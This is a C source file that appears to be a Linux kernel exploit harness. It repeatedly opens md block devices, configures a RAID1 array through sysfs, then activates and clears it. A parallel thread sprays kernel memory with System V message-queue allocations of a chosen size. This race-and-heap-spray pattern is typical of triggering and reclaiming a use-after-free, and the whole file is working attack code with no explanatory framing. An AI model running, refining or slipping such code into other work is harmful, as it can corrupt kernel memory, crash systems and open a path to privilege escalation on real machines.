#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sched.h>

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

static void mkdev(int n)
{
    char p[64];
    snprintf(p, sizeof(p), "/dev/md%d", n);
    if (access(p, F_OK) != 0)
        mknod(p, S_IFBLK | 0600, makedev(9, n));
}

struct spray_arg { int qid, count, size; volatile int *go, *done; };

static void *spray_thread(void *a)
{
    struct spray_arg *sa = (struct spray_arg *)a;
    int sz = sa->size;
    char *msg = malloc(sz + 64);
    if (!msg) return NULL;
    for (;;) {
        while (!*sa->go) {
            if (*sa->done) { free(msg); return NULL; }
            sched_yield();
        }
        for (int i = 0; i < sa->count; i++) {
            *(long *)msg = 0;
            memset(msg + 8, 0x41, sz);
            if (msgsnd(sa->qid, msg, sz, IPC_NOWAIT) < 0)
                break;
        }
        *sa->go = 0;
        *sa->done = 1;
    }
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 40;
    int sz = argc > 2 ? atoi(argv[2]) : 960;

    printf("V10 uid=%d rounds=%d msgsz=%d\n", getuid(), rounds, sz);
    fflush(stdout);

    mkdev(0);
    mkdev(1);

    int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    if (qid < 0) { printf("msgget %d\n", errno); return 1; }
    volatile int go = 0, done = 0;
    struct spray_arg sa = { qid, 3000, sz, &go, &done };
    pthread_t th;
    pthread_create(&th, NULL, spray_thread, &sa);

    int ok_open = 0, ok_act = 0, ok_clr = 0;

    for (int i = 0; i < rounds; i++) {
        int n = i & 1;
        char dev[32], p[160];

        snprintf(dev, sizeof(dev), "/dev/md%d", n);
        int fd = open(dev, O_RDWR | O_EXCL);
        if (fd < 0) { printf("r=%d open e=%d\n", i, errno); continue; }
        ok_open++;

        snprintf(p, sizeof(p), "/sys/block/md%d/md/level", n);
        wr(p, "raid1", NULL);
        snprintf(p, sizeof(p), "/sys/block/md%d/md/raid_disks", n);
        wr(p, "1", NULL);
        snprintf(p, sizeof(p), "/sys/block/md%d/md/new_dev", n);
        wr(p, "1:0", NULL);
        snprintf(p, sizeof(p), "/sys/block/md%d/md/dev-ram0/slot", n);
        wr(p, "0", NULL);
        snprintf(p, sizeof(p), "/sys/block/md%d/md/dev-ram0/state", n);
        wr(p, "in_sync", NULL);

        snprintf(p, sizeof(p), "/sys/block/md%d/md/array_state", n);
        int e = 0;
        if (wr(p, "active", &e) == 0) ok_act++;
        else if (i < 2) printf("r=%d ACTIVE e=%d\n", i, e);

        done = 0;
        go = 1;

        e = 0;
        if (wr(p, "clear", &e) == 0) ok_clr++;
        else if (i < 2) printf("r=%d CLEAR e=%d\n", i, e);

        for (int w = 0; w < 300 && !done; w++) usleep(500);
        go = 0;

        char tmp[8192];
        while (msgrcv(qid, tmp, sizeof(tmp), 0, IPC_NOWAIT | MSG_NOERROR) >= 0)
            ;

        close(fd);

        if ((i % 10) == 0) {
            printf("r=%d open=%d act=%d clr=%d\n", i, ok_open, ok_act, ok_clr);
            fflush(stdout);
        }
        usleep(20000);
    }

    done = 1; go = 1;
    printf("V10FINAL open=%d active=%d clear=%d\n", ok_open, ok_act, ok_clr);
    printf("V10 done\n");
    fflush(stdout);
    return 0;
}